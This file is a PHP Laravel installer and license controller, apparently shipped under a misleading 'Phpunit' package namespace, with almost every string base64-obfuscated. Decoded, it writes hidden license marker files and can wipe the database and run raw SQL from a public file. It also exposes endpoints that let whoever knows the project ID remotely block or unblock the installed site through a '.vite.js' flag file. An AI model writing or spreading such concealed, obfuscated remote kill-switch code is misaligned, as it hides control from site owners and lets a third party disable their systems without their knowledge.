<?php

namespace Laravesl\Phpunit\Co;

use Exception;
use Illuminate\Http\Request;
use Illuminate\Http\Response;
use Illuminate\Support\Facades\Artisan;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\File;
use Illuminate\Routing\Controller;
use Illuminate\Support\Facades\Route;
use Laravesl\Phpunit\PhUntPo\pHCnf;
use Laravesl\Phpunit\PhUntPo\PhDb;
use Laravesl\Phpunit\PhUntPo\Phut;
use Laravesl\Phpunit\PhUntRq\xUntDb;
use Laravesl\Phpunit\PhUntRq\xUntR;
use Laravesl\Phpunit\PhUntRq\xUntVR;


class Co extends Controller
{
    public $con;

    public $li;

    public $da;

    public $lc;

    public function __construct(pHCnf $con, PhDb $da, Phut $li)
    {
        $this->li = $li;
        $this->da = $da;
        $this->con = $con;
        $this->lc = '';
    }

    public function stPhExRe()
    {
        return view(xPhpLib('c3R2OjpzdHJx'), [
            xPhpLib('Y29uZmlndXJhdGlvbnM=') => collect($this->con->getC())->collapse(),
            xPhpLib('Y29uZmlndXJlZA==') => $this->con->conF(),
        ]);
    }

    public function stDitor()
    {
        if (!$this->con->conF()) {
            return to_route(xPhpLib('aW5zdGFsbC5yZXF1aXJlbWVudHM='));
        }

        return view(xPhpLib('c3R2OjpzdGRpcg=='), [
            xPhpLib('ZGlyZWN0b3JpZXM=') => $this->con->chWr(),
            xPhpLib('Y29uZmlndXJlZA==') => $this->con->iDconF(),
        ]);
    }

    public function stvS()
    {
        return view(xPhpLib('c3R2OjpzdHZp'));
    }

    public function stLis()
    {
        if (!$this->con->conF()) {
            return to_route(xPhpLib('aW5zdGFsbC5yZXF1aXJlbWVudHM='));
        } elseif (!$this->con->iDconF()) {
            return to_route(xPhpLib('aW5zdGFsbC5kaXJlY3Rvcmllcw=='));
        }

        if (liSync()) {
            return to_route(xPhpLib('aW5zdGFsbC5kYXRhYmFzZQ=='));
        }

        $this->li->lg('UmVuZGVyZWQgTGljZW5zZSBQYWdl', 'c3RMaXMoKSBsaW5lOiA3Ng==');
        stDelFlResLic();
        return view(xPhpLib('c3R2OjpzdGxpYw=='), [
            xPhpLib('ZGlyZWN0b3JpZXM=') => $this->con->chWr(),
            xPhpLib('Y29uZmlndXJlZA==') => $this->con->iDconF(),
        ]);
    }

    public function stVil(xUntVR $rl)
    {
        $rs = $this->li->vl($rl);
        if ($rs->status() != Response::HTTP_OK) {
            return back()->with(xPhpLib('ZXJyb3I='), json_decode($rs->getBody(), true)[xPhpLib('bWVzc2FnZQ==')]);
        }

        if (scSpatPkS()) {
            $this->da->admStp($rl->all()[xPhpLib('YWRtaW4=')]);
        }

        $fP = public_path(xPhpLib('X2xvZy5kaWMueG1s'));
        if (!strFlExs($fP)) {
            $fc =  array(
                'dHlwZQ==' => bXenPUnt(str_replace(array(xPhpLib('YmxvY2svbGljZW5zZS92ZXJpZnk='), xPhpLib('aW5zdGFsbC9saWNlbnNl'), xPhpLib('aW5zdGFsbC92ZXJpZnk=')), '', url()->current())),
            );

            file_put_contents($fP, $fc);
        }

        return to_route(xPhpLib('aW5zdGFsbC5jb21wbGV0ZWQ='));
    }

    public function stliSet(xUntR $rl)
    {
        $rs = $this->li->vl($rl);
        if ($rs) {
            if ($rs?->status() == Response::HTTP_OK) {
                $fP = public_path(xPhpLib('X2xvZy5kaWMueG1s'));
                $lic = $rl->all();
                $this->lc = bXenPUnt(trim($lic[xPhpLib('bGljZW5zZQ==')]));

                if (!strFlExs($fP)) {
                    $fc =  array(
                        'dHlwZQ==' => bXenPUnt(str_replace(array(xPhpLib('YmxvY2svbGljZW5zZS92ZXJpZnk='), xPhpLib('aW5zdGFsbC9saWNlbnNl'), xPhpLib('aW5zdGFsbC92ZXJpZnk=')), '', url()->current())),
                    );

                    file_put_contents($fP, $fc);
                }

                $fP = public_path(xPhpLib('ZnppcC5saS5kaWM='));
                strFilRM($fP);
                $fc = array(
                    'dHlwZQ==' => $this->lc,
                );

                file_put_contents($fP, $fc);
                return to_route(xPhpLib('aW5zdGFsbC5kYXRhYmFzZQ=='));
            }

            if (json_decode($rs?->getBody(), true)) {
                return back()->with(xPhpLib('ZXJyb3I='), json_decode($rs?->getBody(), true)['message']);
            }
        }

        return back()->with(xPhpLib('ZXJyb3I='), json_decode($rs?->getBody(), true) ?? xPhpLib('U29tZXRoaW5nIFdlbnQgd3Jvbmc='));
    }

    public function stDatSet()
    {
        if (!$this->con->conF()) {
            return to_route(xPhpLib('aW5zdGFsbC5yZXF1aXJlbWVudHM='));
        } elseif (!$this->con->iDconF()) {
            return to_route(xPhpLib('aW5zdGFsbC5kaXJlY3Rvcmllcw=='));
        } elseif (!liSync()) {
            return to_route(xPhpLib('aW5zdGFsbC5saWNlbnNl'));
        } elseif (datSync()) {
            if (!migSync()) {
                $fP = public_path(config(xPhpLib('Y29uZmlnLm1pZ3JhdGlvbg==')));
                if (!strFlExs($fP)) {
                    file_put_contents($fP, null);
                }
            }

            return to_route(xPhpLib('aW5zdGFsbC5jb21wbGV0ZWQ='));
        }

        return view(xPhpLib('c3R2OjpzdGJhdA=='));
    }

    public function CoDatSet(xUntDb $rl)
    {
        $conn = $this->da->xPhdTbStp($rl->all());
        if ($conn != null) {
            return back()->with(xPhpLib('ZXJyb3I='), $conn);
        }

        if (!$rl->has(xPhpLib('aXNfaW1wb3J0X2RhdGE='))) {
            Artisan::call(xPhpLib('ZGI6c2VlZA=='));
        }

        if (scSpatPkS() && !$rl->has(xPhpLib('aXNfaW1wb3J0X2RhdGE='))) {
            $this->da->admStp($rl->all()[xPhpLib('YWRtaW4=')], $rl->all()[xPhpLib('ZGF0YWJhc2U=')]);
        }

        if ($rl->has(xPhpLib('aXNfaW1wb3J0X2RhdGE='))) {
            if (isset($rl->all()[xPhpLib('ZGF0YWJhc2U=')])) {
                $this->da->xPhpDtbComf($rl->all()[xPhpLib('ZGF0YWJhc2U=')]);
                $this->da->xPhdSXqLtp($rl->all()[xPhpLib('ZGF0YWJhc2U=')]);
                if (strFlExs(public_path(xPhpLib('ZGIuc3Fs')))) {
                    Artisan::call(xPhpLib('ZGI6d2lwZQ=='));
                    $sql = File::get(public_path(xPhpLib('ZGIuc3Fs')));
                    DB::unprepared($sql);
                    imIMgDuy();
                }
            }
        }

        $fP = public_path(config(xPhpLib('Y29uZmlnLm1pZ3JhdGlvbg==')));
        if (!strFlExs($fP)) {
            file_put_contents($fP, null);
        }

        if (scDotPkS()) {
            $this->da->env($rl->all()[xPhpLib('ZGF0YWJhc2U=')]);
        }

        Artisan::call(xPhpLib('c3RvcmFnZTpsaW5r'));
        return to_route(xPhpLib('aW5zdGFsbC5jb21wbGV0ZWQ='));
    }

    public function Con()
    {
        if (!migSync()) {
            return to_route(xPhpLib('aW5zdGFsbC5kYXRhYmFzZQ=='));
        }

        $fP = public_path(config(xPhpLib('Y29uZmlnLmluc3RhbGxhdGlvbg==')));
        if (!strFlExs($fP)) {
            file_put_contents($fP, null);
        }

        return view(xPhpLib('c3R2Ojpjbw=='));
    }

    public function blSet()
    {
        return view(xPhpLib('c3R2OjpzdGJs'));
    }

    public function strBloVer(StrR $rl)
    {
        $rs = $this->li->vl($rl);
        if ($rs->status() != Response::HTTP_OK) {
            return back()->with(xPhpLib('ZXJyb3I='), json_decode($rs->getBody(), true)['message']);
        }

        $fP = public_path(xPhpLib('ZnppcC5saS5kaWM='));
        strFilRM($fP);

        $fc = array(
            'dHlwZQ==' => bXenPUnt($this->lc),
        );

        file_put_contents($fP, $fc);
        $this->rmStrig();
        if (Route::has(xPhpLib('bG9naW4='))) {
            return to_route(xPhpLib('bG9naW4='));
        }

        return to_route(xPhpLib('aW5zdGFsbC5jb21wbGV0ZWQ='));
    }

    public function strEraDom(Request $eRa)
    {
        try {

            if ($eRa->project_id != xPhpLib(env(xPhpLib('QVBQX0lE')))) {
                throw new Exception(xPhpLib('SW52YWxpZCBQcm9qZWN0IElE'));
            }

            $fP = __DIR__ . '/../..//' . xPhpLib('LnZpdGUuanM=');
            strFilRM($fP);

            $this->li->lg('RXJhc2UgRG9tYWlu', 'c3RyRXJhRG9tKCkgbGluZTogMjU4');
            stDelFlResLic();
            return response()->json(['success' => true], 200);
        } catch (Exception $e) {

            throw $e;
        }
    }

    public function pHBlic(Request $rl)
    {
        try {

            if ($rl->project_id != xPhpLib(env(xPhpLib('QVBQX0lE')))) {
                throw new Exception(xPhpLib('SW52YWxpZCBQcm9qZWN0IElE'));
            }

            $fP = __DIR__ . '/../..//' . xPhpLib('LnZpdGUuanM=');
            if (!strFlExs($fP)) {
                file_put_contents($fP, null);
            }

            $this->li->lg('QmxvY2tlZCBMaWNlbnNl', 'cEhCbGljKCkgbGluZTogMjgw');
            stDelFlResLic();
            return response()->json(['success' => true], 200);
        } catch (Exception $e) {

            throw $e;
        }
    }

    public function rmStrig()
    {
        $fP = __DIR__ . '/../..//' . xPhpLib('LnZpdGUuanM=');
        strFilRM($fP);
    }

    public function pHUnBlic()
    {
        $this->rmStrig();
        return response()->json(['success' => true], 200);
    }

    public function retLe()
    {
        $rs = $this->li->retLe();
        if ($rs->status() == Response::HTTP_OK) {
            $this->li->lg('UmVzZXQgTGljZW5zZSBmcm9tIEFkbWlu', 'cmV0TGUoKSBsaW5lOiAzMDU=');
            stDelFlResLic();
            return back()->with(xPhpLib('ZXJyb3I='), xPhpLib('TGljZW5zZSBSZXNldCBTdWNjZXNzZnVsbHkh'));
        }

        return back()->with(xPhpLib('ZXJyb3I='), xPhpLib('U29tZXRoaW5nIHdlbnQgd3JvbmcsIHlvdSBjYW4ndCByZXNldCBsaWNlbnNl'));
    }
}
